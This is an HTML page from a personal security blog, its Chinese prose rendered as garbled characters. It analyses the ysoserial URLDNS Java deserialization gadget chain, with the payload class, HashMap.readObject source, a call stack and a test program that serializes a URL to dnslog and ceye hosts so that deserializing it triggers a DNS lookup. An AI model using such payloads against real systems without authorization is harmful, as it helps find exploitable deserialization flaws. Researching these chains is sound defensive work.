

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="Gadget JavaÂü∫‰∫é Chris Frohoff Â∑•ÂÖ∑ÔºåysoserialÁ†îÁ©∂Á≥ªÂàóÁöÑÂà©Áî®ÈìæÔºåÂú®GeneratePayloadË∞ÉÁî®ÊØè‰∏Ä‰∏™ÈìæÁöÑgetObjectÊñπÊ≥ï URLDNS‰Ωú‰∏∫ DNS Êü•ËØ¢ÔºåURLDNS ‰∏çÈúÄË¶Å‰æùËµñÁ¨¨‰∏âÊñπÂåÖÔºå‰πü‰∏çÂèó jdk ÁâàÊú¨ÈôêÂà∂ÔºåÂ∏∏Áî®‰∫éÊ£ÄÊµãÂèçÂ∫èÂàóÂåñ(Âú®ÁõÆÊ†áÊ≤°ÊúâÂõûÊòæÊó∂Êé¢Êµã)Ôºõ‰∏çËÉΩÂëΩ‰ª§ÊâßË°åÔºåÂè™ËÉΩ‰Ωú‰∏∫ DNS ËØ∑Ê±Ç 12345678910111213141516171819">
<meta property="og:type" content="article">
<meta property="og:title" content="Gadget Java">
<meta property="og:url" content="http://example.com/2023/03/15/Gadget%20Java/index.html">
<meta property="og:site_name" content="üóÑ">
<meta property="og:description" content="Gadget JavaÂü∫‰∫é Chris Frohoff Â∑•ÂÖ∑ÔºåysoserialÁ†îÁ©∂Á≥ªÂàóÁöÑÂà©Áî®ÈìæÔºåÂú®GeneratePayloadË∞ÉÁî®ÊØè‰∏Ä‰∏™ÈìæÁöÑgetObjectÊñπÊ≥ï URLDNS‰Ωú‰∏∫ DNS Êü•ËØ¢ÔºåURLDNS ‰∏çÈúÄË¶Å‰æùËµñÁ¨¨‰∏âÊñπÂåÖÔºå‰πü‰∏çÂèó jdk ÁâàÊú¨ÈôêÂà∂ÔºåÂ∏∏Áî®‰∫éÊ£ÄÊµãÂèçÂ∫èÂàóÂåñ(Âú®ÁõÆÊ†áÊ≤°ÊúâÂõûÊòæÊó∂Êé¢Êµã)Ôºõ‰∏çËÉΩÂëΩ‰ª§ÊâßË°åÔºåÂè™ËÉΩ‰Ωú‰∏∫ DNS ËØ∑Ê±Ç 12345678910111213141516171819">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818214739225.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818204044179.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220820153609531.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220824224527904.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220825002800801.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829141357207.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829142036388.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-408eaf857d4e79fd633d58da6ff536f0_r.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20230424201812179.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220925211304382.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20221005230840200.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/f9bee6c5293b753f2421c47eb8cfb7e38.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/t01eee470f626eda79e.png">
<meta property="article:published_time" content="2023-03-15T12:56:37.733Z">
<meta property="article:modified_time" content="2023-09-09T06:58:04.633Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818214739225.png">
  
  <title>Gadget Java - üóÑ</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- Ëá™ÂÆö‰πâÊ†∑Âºè‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->

  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>üë©‚Äçüíª</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Gadget Java">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2023-03-15 20:56" pubdate>
        March 15, 2023 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      138k Â≠ó
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN ÂàÜÈíü
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Gadget Java</h1>
            
            <div class="markdown-body">
              <h1 id="Gadget-Java"><a href="#Gadget-Java" class="headerlink" title="Gadget Java"></a>Gadget Java</h1><p>Âü∫‰∫é Chris Frohoff Â∑•ÂÖ∑Ôºå<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>Á†îÁ©∂Á≥ªÂàóÁöÑÂà©Áî®ÈìæÔºåÂú®<code>GeneratePayload</code>Ë∞ÉÁî®ÊØè‰∏Ä‰∏™ÈìæÁöÑ<code>getObject</code>ÊñπÊ≥ï</p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>‰Ωú‰∏∫ DNS Êü•ËØ¢ÔºåURLDNS ‰∏çÈúÄË¶Å‰æùËµñÁ¨¨‰∏âÊñπÂåÖÔºå‰πü‰∏çÂèó jdk ÁâàÊú¨ÈôêÂà∂ÔºåÂ∏∏Áî®‰∫éÊ£ÄÊµãÂèçÂ∫èÂàóÂåñ(Âú®ÁõÆÊ†áÊ≤°ÊúâÂõûÊòæÊó∂Êé¢Êµã)Ôºõ‰∏çËÉΩÂëΩ‰ª§ÊâßË°åÔºåÂè™ËÉΩ‰Ωú‰∏∫ DNS ËØ∑Ê±Ç</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br><br>                HashMap ht = <span class="hljs-keyword">new</span> HashMap(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                URL u = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Âú®<code>HashMap.readObject</code>ÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-keyword">float</span> lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>            <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>            <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>            <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ËØªÂèñÈîÆÂÄºÂØπÂπ∂‰∏î<code>put</code>Ëøõ<code>mapping</code>ËøáÁ®ã‰∏≠ÔºåËøõË°å‰∫Ü<code>putVal</code>ÔºåÂØπ<code>key</code>ËøõË°å‰∫Ü<code>hash</code>ËÆ°ÁÆóÔºåËøõ‰∏ÄÊ≠•Ë∑üËøõ<code>hash</code>ÊñπÊ≥ïÂèëÁé∞ÔºåÂØπ<code>key</code>ËøõË°å‰∫Ü<code>hashCode</code>ÁöÑËÆ°ÁÆóÔºåËøô‰ºöËß¶Âèë‰∏ÄÊ¨° DNS ËØ∑Ê±ÇÔºåËøôÁÇπÂèØ‰ª•È™åËØÅ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://r5z2ag.ceye.io/&quot;</span>);<br><br>Field hc = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hc.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//hc.set(url,123);</span><br>hm.put(url,<span class="hljs-string">&quot;2333&quot;</span>);<br><span class="hljs-comment">//hc.set(url,-1);</span><br><br><span class="hljs-comment">//hc.set()ÁöÑ‰ΩúÁî®ÊòØÂú®Ë∞ÉÁî®putÊñπÊ≥ïÂâç‰øÆÊîπhashCode‰∏∫ÂÖ∂‰ªñÊï∞ÂÄºÔºåË∞ÉÁî®putÊñπÊ≥ïÂêéÂÜçÂ∞ÜhashCode‰øÆÊîπÂõûÊù•ÔºåÈÅøÂÖçÂèëËµ∑DNSËØ∑Ê±Ç</span><br></code></pre></td></tr></table></figure>

<p>‰ºöÁºìÂ≠ò<code>hashCode</code>ÂàôÂèØ‰ª•Êç¢‰∏™ dnslog Âπ≥Âè∞ËøõË°åÈ™åËØÅ</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818214739225.png" srcset="/img/loading.gif" lazyload></p>
<p><code>key.hashCode</code>‰∏≠Ôºå<code>key</code>ÊòØÂèØÊéßÁöÑ(Êù•Ëá™<code>readObject</code>ËØªÂèñÂà∞ÁöÑ)ÔºåÂΩìÁÑ∂Ë¶ÅÊª°Ë∂≥Êù°‰ª∂<code>mappings &gt; 0</code>Âç≥Â∫èÂàóÂåñÊµÅ‰∏ç‰∏∫Á©∫</p>
<p>ÈÇ£‰∏∫‰ªÄ‰πà‰ºöË∞ÉÁî® URLÔºåÂõ†‰∏∫<code>HashMap.put(url,&#39;anything&#39;)</code>url Â±û‰∫é<code>java.net.URL</code>ÂØπË±°</p>
<p>ÈÇ£‰πàË∑üËøõ<code>key</code>ÂØπË±°Âç≥<code>java.net.URL</code>ÁöÑ<code>hashCode</code>ÊñπÊ≥ï</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220818204044179.png" srcset="/img/loading.gif" lazyload></p>
<p>Á¨¨‰∏Ä‰∏™Êù°‰ª∂ËÇØÂÆöË∑≥Ëøá‰∫ÜÔºå<code>handler</code>ÊòØ<code>URLStreamHandler</code>ÁöÑÂÆû‰æã(‰∏äÈù¢ÊúâÂÆö‰πâ)ÔºåË∑üËøõÂèëÁé∞Ê†πÊçÆÂçèËÆÆ<code>InetAddress addr = getHostAddress(u)</code>ÔºåËøõ‰∏ÄÊ≠•<code>u.hostAddress = InetAddress.getByName(host)</code>‰πüÂ∞±ÊòØÊ†πÊçÆÂüüÂêçÊü•ËØ¢ ip Âç≥‰∏ÄÊ¨° DNS ËØ∑Ê±Ç</p>
<p>Ëá≥Ê≠§ÔºåÊï¥‰∏™Âà©Áî®Èìæ‰πüÂæàÊòéÊòæ</p>
<blockquote>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xl">getByName:<span class="hljs-number">1077</span>, InetAddress (java.net)<br>getHostAddress:<span class="hljs-number">442</span>, URLStreamHandler (java.net)<br>hashCode:<span class="hljs-number">359</span>, URLStreamHandler (java.net)<br>hashCode:<span class="hljs-number">885</span>, URL (java.net)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>main:<span class="hljs-number">19</span>, Test (ysoserial)<br><br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span>readObject()<br>H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span>hash()<br>URL-&gt;hashCode()<br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>hashCode()<br>URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>getHostAddress()<br>I<span class="hljs-function"><span class="hljs-title">netAddress</span>-&gt;</span>getByName()<br>‰∏äÈù¢ÁöÑË∞ÉÁî®Ê†àÊòØysoserialÂØºÂá∫Êù•ÁöÑÔºåÈáçÂÜô‰∫ÜSilentURLStreamHandlerÔºåÂõ†Ê≠§Áï•ÂæÆÊúâ‰∫õ‰∏çÂêå<br></code></pre></td></tr></table></figure>
</blockquote>
<p>Â∫èÂàóÂåñÂπ∂ËæìÂá∫Êñá‰ª∂</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://ir2jn4.dnslog.cn/&quot;</span>);<br><br>        Field hc = Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hc.setAccessible(<span class="hljs-keyword">true</span>);<br>        hc.set(url,<span class="hljs-number">123</span>);<br>        hm.put(url,<span class="hljs-string">&quot;2333&quot;</span>);<br>        hc.set(url,-<span class="hljs-number">1</span>);<br><br><span class="hljs-comment">//ËæìÂá∫Âà∞Êñá‰ª∂</span><br>        <span class="hljs-keyword">try</span>&#123;<br>            FileOutputStream outputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./2.ser&quot;</span>);<br>            ObjectOutputStream outputStream1 = <span class="hljs-keyword">new</span> ObjectOutputStream(outputStream);<br>            outputStream1.writeObject(hm);<br>            outputStream.close();<br>            outputStream1.close();<br>            FileInputStream inputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./2.ser&quot;</span>);<br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>            objectInputStream.readObject();<br>            objectInputStream.close();<br>            inputStream.close();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>ÂØπÁîüÊàêÁöÑÊñá‰ª∂ËøõË°åÂèçÂ∫èÂàóÂåñ</p>
